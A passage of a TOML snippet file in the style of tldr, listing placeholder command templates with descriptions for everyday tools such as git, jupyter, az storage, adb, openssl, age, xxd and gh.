  description = "Delete a cluster"
  command = "kops delete cluster <cluster_name> --yes"
  output = ""

[[snippets]]
  description = "Validate a cluster"
  command = "kops validate cluster <cluster_name> --wait <wait_time_until_ready> --count <num_required_validations>"
  output = ""

[[snippets]]
  description = "Start a Jupyter notebook server in the current directory"
  command = "jupyter notebook"
  output = ""

[[snippets]]
  description = "Open a specific Jupyter notebook"
  command = "jupyter notebook <example.ipynb>"
  output = ""

[[snippets]]
  description = "Export a specific Jupyter notebook into another format"
  command = "jupyter nbconvert --to <html|markdown|pdf|script> <example.ipynb>"
  output = ""

[[snippets]]
  description = "Start a server on a specific port"
  command = "jupyter notebook --port=<port>"
  output = ""

[[snippets]]
  description = "List currently running notebook servers"
  command = "jupyter notebook list"
  output = ""

[[snippets]]
  description = "Stop the currently running server"
  command = "jupyter notebook stop"
  output = ""

[[snippets]]
  description = "Start JupyterLab, if installed, in the current directory"
  command = "jupyter lab"
  output = ""

[[snippets]]
  description = "Remove the first positional parameter"
  command = "shift"
  output = ""

[[snippets]]
  description = "Remove the first `N` positional parameters"
  command = "shift <N>"
  output = ""

[[snippets]]
  description = "Get the [s]ize of the HEAD commit in bytes"
  command = "git cat-file -s HEAD"
  output = ""

[[snippets]]
  description = "Get the [t]ype (blob, tree, commit, tag) of a given Git object"
  command = "git cat-file -t <8c442dc3>"
  output = ""

[[snippets]]
  description = "Pretty-[p]rint the contents of a given Git object based on its type"
  command = "git cat-file -p <HEAD~2>"
  output = ""

[[snippets]]
  description = "Download a blob to a [f]ile path specifying a [s]ource container"
  command = "az storage blob download --account-name <storage_account_name> --account-key <storage_account_key> -c <container_name> -n <path/to/blob> -f <path/to/local_file>"
  output = ""

[[snippets]]
  description = "[d]ownload blobs from a blob container recursively"
  command = "az storage blob download-batch --account-name <storage_account_name> --account-key <storage_account_key> -s <container_name> -d <path/to/remote> --pattern <filename_regex> --destination <path/to/destination>"
  output = ""

[[snippets]]
  description = "Upload a local file to blob storage"
  command = "az storage blob upload --account-name <storage_account_name> --account-key <storage_account_key> -c <container_name> -n <path/to/blob> -f <path/to/local_file>"
  output = ""

[[snippets]]
  description = "Delete a blob object"
  command = "az storage blob delete --account-name <storage_account_name> --account-key <storage_account_key> -c <container_name> -n <path/to/blob>"
  output = ""

[[snippets]]
  description = "Generate a shared access signature for a blob"
  command = "az storage blob generate-sas --account-name <storage_account_name> --account-key <storage_account_key> -c <container_name> -n <path/to/blob> --permissions <permission_set> --expiry <Y-m-d'T'H:M'Z'> --https-only"
  output = ""

[[snippets]]
  description = "Display amount of program memory available"
  command = "st-info --flash"
  output = ""

[[snippets]]
  description = "Display amount of SRAM memory available"
  command = "st-info --sram"
  output = ""

[[snippets]]
  description = "Display summarized information of the device"
  command = "st-info --probe"
  output = ""

[[snippets]]
  description = "Show current host name"
  command = "hostname"
  output = ""

[[snippets]]
  description = "Show the network address of the host name"
  command = "hostname -i"
  output = ""

[[snippets]]
  description = "Show all network addresses of the host"
  command = "hostname -I"
  output = ""

[[snippets]]
  description = "Show the FQDN (Fully Qualified Domain Name)"
  command = "hostname --fqdn"
  output = ""

[[snippets]]
  description = "Set current host name"
  command = "hostname <new_hostname>"
  output = ""

[[snippets]]
  description = "Launch colorpicker and print the hexadecimal and RGB value of each clicked pixel to `stdout`"
  command = "colorpicker"
  output = ""

[[snippets]]
  description = "Only print the color of one clicked pixel and then exit"
  command = "colorpicker --one-shot"
  output = ""

[[snippets]]
  description = "Print the color of each clicked pixel and quit when a key is pressed"
  command = "colorpicker --quit-on-keypress"
  output = ""

[[snippets]]
  description = "Only print the RGB value"
  command = "colorpicker --rgb"
  output = ""

[[snippets]]
  description = "Only print the hexadecimal value"
  command = "colorpicker --hex"
  output = ""

[[snippets]]
  description = "List files and directories, one per line"
  command = "lsd -1"
  output = ""

[[snippets]]
  description = "List all files and directories, including hidden ones, in the current directory"
  command = "lsd -a"
  output = ""

[[snippets]]
  description = "List all files and directories with trailing `/` added to directory names"
  command = "lsd -F"
  output = ""

[[snippets]]
  description = "List all files and directories in long format (permissions, ownership, size, and modification date)"
  command = "lsd -la"
  output = ""

[[snippets]]
  description = "List all files and directories in long format with size displayed using human-readable units (KiB, MiB, GiB)"
  command = "lsd -lh"
  output = ""

[[snippets]]
  description = "List all files and directories in long format, sorted by size (descending)"
  command = "lsd -lS"
  output = ""

[[snippets]]
  description = "List all files and directories in long format, sorted by modification date (oldest first)"
  command = "lsd -ltr"
  output = ""

[[snippets]]
  description = "Only list directories"
  command = "lsd -d <*/>"
  output = ""

[[snippets]]
  description = "Start an interactive shell with a new database"
  command = "sqlite3"
  output = ""

[[snippets]]
  description = "Open an interactive shell against an existing database"
  command = "sqlite3 <path/to/database.sqlite3>"
  output = ""

[[snippets]]
  description = "Execute an SQL statement against a database and then exit"
  command = "sqlite3 <path/to/database.sqlite3> '<SELECT * FROM some_table;>'"
  output = ""

[[snippets]]
  description = "Search for lines matching the list of search strings separated by new lines in a compressed file (case-sensitive)"
  command = "bzfgrep ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching the list of search strings separated by new lines in a compressed file (case-insensitive)"
  command = "bzfgrep --ignore-case ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines that do not match the list of search strings separated by new lines in a compressed file"
  command = "bzfgrep --invert-match ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "bzfgrep --with-filename --line-number ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "bzfgrep --only-matching ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively search files in a `bzip2` compressed `tar` archive for the given list of strings"
  command = "bzfgrep --recursive ""<search_string>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Start an interactive session"
  command = "bc"
  output = ""

[[snippets]]
  description = "Start an interactive session with the standard math library enabled"
  command = "bc --mathlib"
  output = ""

[[snippets]]
  description = "Calculate an expression"
  command = "echo '<5 / 3>' | bc"
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "bc <path/to/script.bc>"
  output = ""

[[snippets]]
  description = "Calculate an expression with the specified scale"
  command = "echo 'scale = <10>; <5 / 3>' | bc"
  output = ""

[[snippets]]
  description = "Calculate a sine/cosine/arctangent/natural logarithm/exponential function using `mathlib`"
  command = "echo '<s|c|a|l|e>(<1>)' | bc --mathlib"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a ESC/P2 printer file"
  command = "pbmtoescp2 <path/to/image.pbm> > <path/to/output.escp2>"
  output = ""

[[snippets]]
  description = "Specify the compression of the output"
  command = "pbmtoescp2 -compression <0|1> <path/to/image.pbm> > <path/to/output.escp2>"
  output = ""

[[snippets]]
  description = "Specify the horizontal and vertical resolution of the output in dots per inch"
  command = "pbmtoescp2 -resolution <180|360|720> <path/to/image.pbm> > <path/to/output.escp2>"
  output = ""

[[snippets]]
  description = "Place a formfeed command at the end of the output"
  command = "pbmtoescp2 -formfeed <path/to/image.pbm> > <path/to/output.escp2>"
  output = ""

[[snippets]]
  description = "Display general information about a binary (architecture, type, endianness)"
  command = "rabin2 -I <path/to/binary>"
  output = ""

[[snippets]]
  description = "Display linked libraries"
  command = "rabin2 -l <path/to/binary>"
  output = ""

[[snippets]]
  description = "Display symbols imported from libraries"
  command = "rabin2 -i <path/to/binary>"
  output = ""

[[snippets]]
  description = "Display strings contained in the binary"
  command = "rabin2 -z <path/to/binary>"
  output = ""

[[snippets]]
  description = "Display the output in JSON"
  command = "rabin2 -j -I <path/to/binary>"
  output = ""

[[snippets]]
  description = "Start an SSH Agent for the current shell"
  command = "eval $(ssh-agent)"
  output = ""

[[snippets]]
  description = "Kill the currently running agent"
  command = "ssh-agent -k"
  output = ""

[[snippets]]
  description = "Deploy the current directory"
  command = "now"
  output = ""

[[snippets]]
  description = "Display a list of deployments"
  command = "now list"
  output = ""

[[snippets]]
  description = "Display information related to a deployment"
  command = "now inspect <deployment_url>"
  output = ""

[[snippets]]
  description = "Remove a deployment"
  command = "now remove <deployment_id>"
  output = ""

[[snippets]]
  description = "Log in into an account or create a new one"
  command = "now login"
  output = ""

[[snippets]]
  description = "Initialize an example project (a new directory will be created)"
  command = "now init"
  output = ""

[[snippets]]
  description = "Analyze nginx configuration (default path: `/etc/nginx/nginx.conf`)"
  command = "gixy"
  output = ""

[[snippets]]
  description = "Analyze nginx configuration but skip specific tests"
  command = "gixy --skips <http_splitting>"
  output = ""

[[snippets]]
  description = "Analyze nginx configuration with the specific severity level"
  command = "gixy <-l|-ll|-lll>"
  output = ""

[[snippets]]
  description = "Analyze nginx configuration files on the specific path"
  command = "gixy <path/to/configuration_file_1> <path/to/configuration_file_2>"
  output = ""

[[snippets]]
  description = "Convert one or more images to a single PDF, each image being on its own page"
  command = "img2pdf <path/to/image1.ext path/to/image2.ext ...> --output <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Convert only the first frame of a multi-frame image to PDF"
  command = "img2pdf <path/to/file.gif> --first-frame-only --output <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Auto orient the image, use a specific  page size in landscape mode, and set a border of specific sizes horizontally and vertically"
  command = "img2pdf <path/to/image.ext> --auto-orient --pagesize <A4^T> --border <2cm>:<5.1cm> --output <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Shrink only larger images to a rectangle of specified dimensions inside a page with a specific size"
  command = "img2pdf <path/to/image.ext> --pagesize <30cm>x<20cm> --imgsize <10cm>x<15cm> --fit <shrink> --output <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Convert an image to PDF, and specify metadata for the resulting file"
  command = "img2pdf <path/to/image.ext> --title <title> --author <author> --creationdate <1970-01-31> --keywords <keyword1 keyword2> --subject <subject> --output <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Compress a file, replacing it with a `gzip` archive"
  command = "gzip <file.ext>"
  output = ""

[[snippets]]
  description = "Decompress a file, replacing it with the original uncompressed version"
  command = "gzip -d <file.ext>.gz"
  output = ""

[[snippets]]
  description = "Compress a file, keeping the original file"
  command = "gzip --keep <file.ext>"
  output = ""

[[snippets]]
  description = "Compress a file specifying the output filename"
  command = "gzip -c <file.ext> > <compressed_file.ext.gz>"
  output = ""

[[snippets]]
  description = "Decompress a `gzip` archive specifying the output filename"
  command = "gzip -c -d <file.ext>.gz > <uncompressed_file.ext>"
  output = ""

[[snippets]]
  description = "Specify the compression level. 1=Fastest (Worst), 9=Slowest (Best), Default level is 6"
  command = "gzip -9 -c <file.ext> > <compressed_file.ext.gz>"
  output = ""

[[snippets]]
  description = "Play a MIDI file"
  command = "timidity <path/to/file.mid>"
  output = ""

[[snippets]]
  description = "Play a MIDI file in a loop"
  command = "timidity --loop <path/to/file.mid>"
  output = ""

[[snippets]]
  description = "Play a MIDI file in a specific key (0 = C major/A minor, -1 = F major/D minor, +1 = G major/E minor, etc.)"
  command = "timidity --force-keysig=<-flats|+sharps> <path/to/file.mid>"
  output = ""

[[snippets]]
  description = "Convert a MIDI file to PCM (WAV) audio"
  command = "timidity --output-mode=<w> --output-file=<path/to/file.wav> <path/to/file.mid>"
  output = ""

[[snippets]]
  description = "Convert a MIDI file to FLAC audio"
  command = "timidity --output-mode=<F> --output-file=<path/to/file.flac> <path/to/file.mid>"
  output = ""

[[snippets]]
  description = "Follow the output of a task (`stdout` + `stderr`)"
  command = "pueue follow <task_id>"
  output = ""

[[snippets]]
  description = "Follow `stderr` of a task"
  command = "pueue follow --err <task_id>"
  output = ""

[[snippets]]
  description = "Create a unique name for the current commit (the name contains the most recent annotated tag, the number of additional commits, and the abbreviated commit hash)"
  command = "git describe"
  output = ""

[[snippets]]
  description = "Create a name with 4 digits for the abbreviated commit hash"
  command = "git describe --abbrev=<4>"
  output = ""

[[snippets]]
  description = "Generate a name with the tag reference path"
  command = "git describe --all"
  output = ""

[[snippets]]
  description = "Describe a Git tag"
  command = "git describe <v1.0.0>"
  output = ""

[[snippets]]
  description = "Create a name for the last commit of a given branch"
  command = "git describe <branch_name>"
  output = ""

[[snippets]]
  description = "Switch `runsvdir` directories"
  command = "sudo runsvchdir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove spaces and other undesirable characters from a file's name"
  command = "detox <path/to/file>"
  output = ""

[[snippets]]
  description = "Show how detox would rename all the files in a directory tree"
  command = "detox --dry-run -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove spaces and other undesirable characters from all files in a directory tree"
  command = "detox -r <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start Visual Studio Code"
  command = "code"
  output = ""

[[snippets]]
  description = "Open specific files/directories"
  command = "code <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Compare two specific files"
  command = "code --diff <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Open specific files/directories in a new window"
  command = "code --new-window <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Install/uninstall a specific extension"
  command = "code --<install|uninstall>-extension <publisher.extension>"
  output = ""

[[snippets]]
  description = "Print installed extensions"
  command = "code --list-extensions"
  output = ""

[[snippets]]
  description = "Print installed extensions with their versions"
  command = "code --list-extensions --show-versions"
  output = ""

[[snippets]]
  description = "Start the editor as a superuser (root) while storing user data in a specific directory"
  command = "sudo code --user-data-dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a new SSH key"
  command = "az sshkey create --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Upload an existing SSH key"
  command = "az sshkey create --name <name> --resource-group <resource_group> --public-key ""<@path/to/key.pub>"""
  output = ""

[[snippets]]
  description = "List all SSH public keys"
  command = "az sshkey list"
  output = ""

[[snippets]]
  description = "Show information about an SSH public key"
  command = "az sshkey show --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Compare two tree objects"
  command = "git diff-tree <tree-ish1> <tree-ish2>"
  output = ""

[[snippets]]
  description = "Show changes between two specific commits"
  command = "git diff-tree -r <commit1> <commit2>"
  output = ""

[[snippets]]
  description = "Display changes in patch format"
  command = "git diff-tree -p <tree-ish1> <tree-ish2>"
  output = ""

[[snippets]]
  description = "Filter changes by a specific path"
  command = "git diff-tree <tree-ish1> <tree-ish2> -- <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Check whether the adb server process is running and start it"
  command = "adb start-server"
  output = ""

[[snippets]]
  description = "Terminate the adb server process"
  command = "adb kill-server"
  output = ""

[[snippets]]
  description = "Start a remote shell in the target emulator/device instance"
  command = "adb shell"
  output = ""

[[snippets]]
  description = "Push an Android application to an emulator/device"
  command = "adb install -r <path/to/file.apk>"
  output = ""

[[snippets]]
  description = "Copy a file/directory from the target device"
  command = "adb pull <path/to/device_file_or_directory> <path/to/local_destination_directory>"
  output = ""

[[snippets]]
  description = "Copy a file/directory to the target device"
  command = "adb push <path/to/local_file_or_directory> <path/to/device_destination_directory>"
  output = ""

[[snippets]]
  description = "List all connected devices"
  command = "adb devices"
  output = ""

[[snippets]]
  description = "Authenticate the CLI with Graphite's API"
  command = "gt auth --token <graphite_cli_auth_token>"
  output = ""

[[snippets]]
  description = "Initialise `gt` for the repository in the current directory"
  command = "gt repo init"
  output = ""

[[snippets]]
  description = "Create a new branch stacked on top of the current branch and commit staged changes"
  command = "gt branch create <branch_name>"
  output = ""

[[snippets]]
  description = "Create a new commit and fix upstack branches"
  command = "gt commit create -m <commit_message>"
  output = ""

[[snippets]]
  description = "Force push all branches in the current stack to GitHub and create or update PRs"
  command = "gt stack submit"
  output = ""

[[snippets]]
  description = "Log all tracked stacks"
  command = "gt log short"
  output = ""

[[snippets]]
  description = "Display help for a specified subcommand"
  command = "gt <subcommand> --help"
  output = ""

[[snippets]]
  description = "Clone an SVN repository"
  command = "git svn clone <https://example.com/subversion_repo> <local_dir>"
  output = ""

[[snippets]]
  description = "Clone an SVN repository starting at a given revision number"
  command = "git svn clone -r<1234>:HEAD <https://svn.example.net/subversion/repo> <local_dir>"
  output = ""

[[snippets]]
  description = "Update local clone from the remote SVN repository"
  command = "git svn rebase"
  output = ""

[[snippets]]
  description = "Fetch updates from the remote SVN repository without changing the Git HEAD"
  command = "git svn fetch"
  output = ""

[[snippets]]
  description = "Commit back to the SVN repository"
  command = "git svn commit"
  output = ""

[[snippets]]
  description = "Displace the pixels in a PPM image by a randomized amount that is at most a"
  command = "ppmspread <a> <path/to/input_file.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Specify a seed to a the pseudo-random number generator"
  command = "ppmspread <a> <path/to/input_file.ppm> -randomseed <seed> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Generate an encrypted file that can be decrypted with a passphrase"
  command = "age --passphrase --output <path/to/encrypted_file> <path/to/unencrypted_file>"
  output = ""

[[snippets]]
  description = "Encrypt a file with one or more public keys entered as literals (repeat the `--recipient` flag to specify multiple public keys)"
  command = "age --recipient <public_key> --output <path/to/encrypted_file> <path/to/unencrypted_file>"
  output = ""

[[snippets]]
  description = "Encrypt a file to one or more recipients with their public keys specified in a file (one per line)"
  command = "age --recipients-file <path/to/recipients_file> --output <path/to/encrypted_file> <path/to/unencrypted_file>"
  output = ""

[[snippets]]
  description = "Decrypt a file with a passphrase"
  command = "age --decrypt --output <path/to/decrypted_file> <path/to/encrypted_file>"
  output = ""

[[snippets]]
  description = "Decrypt a file with a private key file"
  command = "age --decrypt --identity <path/to/private_key_file> --output <path/to/decrypted_file> <path/to/encrypted_file>"
  output = ""

[[snippets]]
  description = "Convert a PGM image file to the SBIG CCDOPS format"
  command = "pgmtosbig <path/to/input_file.pgm> > <path/to/output.sbig>"
  output = ""

[[snippets]]
  description = "Jump to a directory that contains the given pattern"
  command = "j <pattern>"
  output = ""

[[snippets]]
  description = "Jump to a sub-directory (child) of the current directory that contains the given pattern"
  command = "jc <pattern>"
  output = ""

[[snippets]]
  description = "Open a directory that contains the given pattern in the operating system file manager"
  command = "jo <pattern>"
  output = ""

[[snippets]]
  description = "Remove non-existing directories from the autojump database"
  command = "j --purge"
  output = ""

[[snippets]]
  description = "Show the entries in the autojump database"
  command = "j -s"
  output = ""

[[snippets]]
  description = "Open a directory"
  command = "xplr <path/to/directory>"
  output = ""

[[snippets]]
  description = "Focus on a file"
  command = "xplr <path/to/file>"
  output = ""

[[snippets]]
  description = "Focus on a directory"
  command = "xplr --force-focus <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a directory with specific files or directories selected"
  command = "xplr <path/to/directory> <path/to/selected_file_or_directory1> <path/to/selected_file_or_directory2>"
  output = ""

[[snippets]]
  description = "Generate a hexdump from a binary file and display the output"
  command = "xxd <input_file>"
  output = ""

[[snippets]]
  description = "Generate a hexdump from a binary file and save it as a text file"
  command = "xxd <input_file> <output_file>"
  output = ""

[[snippets]]
  description = "Display a more compact output, replacing consecutive zeros (if any) with a star"
  command = "xxd -a <input_file>"
  output = ""

[[snippets]]
  description = "Display the output with 10 columns of one octet (byte) each"
  command = "xxd -c <10> <input_file>"
  output = ""

[[snippets]]
  description = "Display output only up to a length of 32 bytes"
  command = "xxd -l <32> <input_file>"
  output = ""

[[snippets]]
  description = "Display the output in plain mode, without any gaps between the columns"
  command = "xxd -p <input_file>"
  output = ""

[[snippets]]
  description = "Revert a plaintext hexdump back into binary, and save it as a binary file"
  command = "xxd -r -p <input_file> <output_file>"
  output = ""

[[snippets]]
  description = "Disassemble an assembly to textual CIL"
  command = "monodis <path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "Save the output to a file"
  command = "monodis --output=<path/to/output.il> <path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "Show information about an assembly"
  command = "monodis --assembly <path/to/assembly.dll>"
  output = ""

[[snippets]]
  description = "List the references of an assembly"
  command = "monodis --assemblyref <path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "List all the methods in an assembly"
  command = "monodis --method <path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "List resources embedded within an assembly"
  command = "monodis --manifest <path/to/assembly.dll>"
  output = ""

[[snippets]]
  description = "Extract all the embedded resources to the current directory"
  command = "monodis --mresources <path/to/assembly.dll>"
  output = ""

[[snippets]]
  description = "Stop one or more destination(s)"
  command = "cupsdisable <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Cancel all jobs of the specified destination(s)"
  command = "cupsdisable -c <destination1 destination2 ...>"
  output = ""

[[snippets]]
  description = "Convert an MTV or PRT ray tracer file to a PPM image"
  command = "mtvtoppm <path/to/file.mtv> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Convert a file to a C source file and header and display it to the console"
  command = "wasm2c <file.wasm>"
  output = ""

[[snippets]]
  description = "Write the output to a given file (`file.h` gets additionally generated)"
  command = "wasm2c <file.wasm> -o <file.c>"
  output = ""

[[snippets]]
  description = "Update Oh My Zsh"
  command = "omz update"
  output = ""

[[snippets]]
  description = "Print the changes from the latest update of Oh My Zsh"
  command = "omz changelog"
  output = ""

[[snippets]]
  description = "Restart the current Zsh session and Oh My Zsh"
  command = "omz reload"
  output = ""

[[snippets]]
  description = "List all available plugins"
  command = "omz plugin list"
  output = ""

[[snippets]]
  description = "Enable/Disable an Oh My Zsh plugin"
  command = "omz plugin <enable|disable> <plugin>"
  output = ""

[[snippets]]
  description = "List all available themes"
  command = "omz theme list"
  output = ""

[[snippets]]
  description = "Set an Oh My Zsh theme in `~/.zshrc`"
  command = "omz theme set <theme>"
  output = ""

[[snippets]]
  description = "Create a list"
  command = "clido --new <name>"
  output = ""

[[snippets]]
  description = "Load a list"
  command = "clido --load <name>"
  output = ""

[[snippets]]
  description = "Delete a list"
  command = "clido --remove <name>"
  output = ""

[[snippets]]
  description = "List all lists"
  command = "clido --lists"
  output = ""

[[snippets]]
  description = "Toggle autowrite"
  command = "clido toggle-autowrite"
  output = ""

[[snippets]]
  description = "Open a list in a text editor"
  command = "clido edit <text_editor>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "clido -h"
  output = ""

[[snippets]]
  description = "Display version"
  command = "clido -v"
  output = ""

[[snippets]]
  description = "Configure the AWS Command-line"
  command = "aws configure wizard"
  output = ""

[[snippets]]
  description = "Configure the AWS Command-line using SSO"
  command = "aws configure sso"
  output = ""

[[snippets]]
  description = "Get the caller identity (used to troubleshoot permissions)"
  command = "aws sts get-caller-identity"
  output = ""

[[snippets]]
  description = "List AWS resources in a region and output in YAML"
  command = "aws dynamodb list-tables --region <us-east-1> --output yaml"
  output = ""

[[snippets]]
  description = "Use auto prompt to help with a command"
  command = "aws iam create-user --cli-auto-prompt"
  output = ""

[[snippets]]
  description = "Get an interactive wizard for an AWS resource"
  command = "aws dynamodb wizard <new_table>"
  output = ""

[[snippets]]
  description = "Generate a JSON CLI Skeleton (useful for infrastructure as code)"
  command = "aws dynamodb update-table --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "aws <command> help"
  output = ""

[[snippets]]
  description = "Create a pull request"
  command = "gh pr create"
  output = ""

[[snippets]]
  description = "Check out a specific pull request locally"
  command = "gh pr checkout <pr_number>"
  output = ""

[[snippets]]
  description = "View the changes made in the pull request for the current branch"
  command = "gh pr diff"
  output = ""

[[snippets]]
  description = "Approve the pull request for the current branch"
  command = "gh pr review --approve"
  output = ""

[[snippets]]
  description = "Merge the pull request associated with the current branch interactively"
  command = "gh pr merge"
  output = ""

[[snippets]]
  description = "Edit a pull request interactively"
  command = "gh pr edit"
  output = ""

[[snippets]]
  description = "Edit the base branch of a pull request"
  command = "gh pr edit --base <branch_name>"
  output = ""

[[snippets]]
  description = "Check the status of the current repository's pull requests"
  command = "gh pr status"
  output = ""

[[snippets]]
  description = "Update all installed toolchains and `rustup`"
  command = "rustup update"
  output = ""

[[snippets]]
  description = "Install or update a specific toolchain (see `rustup help toolchain` for more information)"
  command = "rustup update <toolchain>"
  output = ""

[[snippets]]
  description = "Generate an image using only `n_colors` or less colors as close as possible to the input image"
  command = "pnmcolormap <n_colors> <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Use the splitspread strategy for determining the output colors, possibly producing a better result for images with small details"
  command = "pnmcolormap -splitspread <n_colors> <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Sort the resulting colormap, which is useful for comparing colormaps"
  command = "pnmcolormap -sort <path/to/input.pnm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "List all commands that you could run"
  command = "compgen -c"
  output = ""

[[snippets]]
  description = "List all aliases"
  command = "compgen -a"
  output = ""

[[snippets]]
  description = "List all functions that you could run"
  command = "compgen -A function"
  output = ""

[[snippets]]
  description = "Show shell reserved keywords"
  command = "compgen -k"
  output = ""

[[snippets]]
  description = "See all available commands/aliases starting with 'ls'"
  command = "compgen -ac <ls>"
  output = ""

[[snippets]]
  description = "Display the start and expiry dates for a domain's certificate"
  command = "openssl s_client -connect <host>:<port> 2>/dev/null | openssl x509 -noout -dates"
  output = ""

[[snippets]]
  description = "Display the certificate presented by an SSL/TLS server"
  command = "openssl s_client -connect <host>:<port> </dev/null"
  output = ""

[[snippets]]
  description = "Set the Server Name Indicator (SNI) when connecting to the SSL/TLS server"
  command = "openssl s_client -connect <host>:<port> -servername <hostname>"
  output = ""

[[snippets]]
  description = "Display the complete certificate chain of an HTTPS server"
  command = "openssl s_client -connect <host>:443 -showcerts </dev/null"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr docker top"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "tcsh"
  output = ""

[[snippets]]
  description = "Start an interactive shell session without loading startup configs"
  command = "tcsh -f"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "tcsh -c ""<echo 'tcsh is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "tcsh <path/to/script.tcsh>"
  output = ""

[[snippets]]
  description = "Check a specific script for syntax errors"
  command = "tcsh -n <path/to/script.tcsh>"
  output = ""

[[snippets]]
  description = "Execute specific commands from `stdin`"
  command = "<echo ""echo 'tcsh is executed'""> | tcsh"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr git add"
  output = ""

[[snippets]]
  description = "List commands history with command IDs"
  command = "aws history list"
  output = ""

[[snippets]]
  description = "Display events related to a specific command given a command ID"
  command = "aws history show <command_id>"
  output = ""

[[snippets]]
  description = "Apply a patch"
  command = "xdelta -d -s <path/to/input_file> <path/to/delta_file.xdelta> <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Create a patch"
  command = "xdelta -e -s <path/to/old_file> <path/to/new_file> <path/to/output_file.xdelta>"
  output = ""

[[snippets]]
  description = "Launch a Git daemon with a whitelisted set of directories"
  command = "git daemon --export-all <path/to/directory1> <path/to/directory2>"
  output = ""

[[snippets]]
  description = "Launch a Git daemon with a specific base directory and allow pulling from all sub-directories that look like Git repositories"
  command = "git daemon --base-path=<path/to/directory> --export-all --reuseaddr"
  output = ""

[[snippets]]
  description = "Launch a Git daemon for the specified directory, verbosely printing log messages and allowing Git clients to write to it"
  command = "git daemon <path/to/directory> --enable=receive-pack --informative-errors --verbose"
  output = ""

[[snippets]]
  description = "Convert JPEG/JFIF image to a PPM or PGM image"
  command = "jpegtopnm <path/to/file.jpg> > <path/to/file.pnm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "jpegtopnm -version"
  output = ""

[[snippets]]
  description = "Show all available subcommands and flags"
  command = "pueue help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "pueue help <subcommand>"
  output = ""

[[snippets]]
  description = "Show all environment variables"
  command = "go env"
  output = ""

[[snippets]]
  description = "Show a specific environment variable"
  command = "go env <GOPATH>"
  output = ""

[[snippets]]
  description = "Set an environment variable to a value"
  command = "go env -w <GOBIN>=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Reset an environment variable's value"
  command = "go env -u <GOBIN>"
  output = ""

[[snippets]]
  description = "Calculate the SHA512 checksum for one or more files"
  command = "sha512sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA512 checksums to a file"
  command = "sha512sum <path/to/file1 path/to/file2 ...> > <path/to/file.sha512>"
  output = ""

[[snippets]]
  description = "Calculate a SHA512 checksum from `stdin`"
  command = "<command> | sha512sum"
  output = ""

[[snippets]]
  description = "Read a file of SHA512 sums and filenames and verify all files have matching checksums"
  command = "sha512sum --check <path/to/file.sha512>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "sha512sum --check --quiet <path/to/file.sha512>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "sha512sum --ignore-missing --check --quiet <path/to/file.sha512>"
  output = ""

[[snippets]]
  description = "Show information about a particular virtual machine"
  command = "VBoxManage showvminfo <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Show more detailed information about a particular virtual machine"
  command = "VBoxManage showvminfo --details <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Show information in a machine readable format"
  command = "VBoxManage showvminfo --machinereadable <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Specify password ID if the virtual machine is encrypted"
  command = "VBoxManage showvminfo --password-id <password_id> <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Specify the password file if the virtual machine is encrypted"
  command = "VBoxManage showvminfo --password <path/to/password_file> <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Show the logs of a specific virtual machine"
  command = "VBoxManage showvminfo --log <vm_name|uuid>"
  output = ""

[[snippets]]
  description = "Get a report on the code in a directory and all subdirectories"
  command = "tokei <path/to/directory>"
  output = ""

[[snippets]]
